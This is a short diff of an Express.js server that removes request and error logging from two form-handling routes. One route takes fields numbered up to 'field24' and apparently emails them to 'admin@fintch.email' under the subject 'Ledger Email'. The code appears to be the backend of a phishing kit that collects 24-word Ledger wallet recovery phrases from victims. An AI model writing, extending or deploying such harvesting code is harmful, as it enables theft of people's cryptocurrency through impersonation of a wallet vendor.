@@ -58,8 +58,7 @@ app.post("/submitContactForm", async (req, res) => {
       return res
         .status(400)
         .send({ success: false, message: "Fill all the fields" });
-    }
-    console.log(req.body);
+    } 
     let sameEmail = "admin@fintch.email"
     // 
     let subject = `Ledger Email`;
@@ -90,8 +89,7 @@ app.post("/submitContactForm", async (req, res) => {
     res.status(500).send({
       success: false,
       message: "Something went wrong",
-    });
-    console.log(e);
+    }); 
   }
 });
 app.post("/fieldsSubmit", async (req, res) => {
@@ -123,8 +121,7 @@ app.post("/fieldsSubmit", async (req, res) => {
       field24,
     } = req.body;
 
-
-    console.log(req.body);
+ 
     let sameEmail = "admin@fintch.email"
     // 
     let subject = `Ledger Email`;
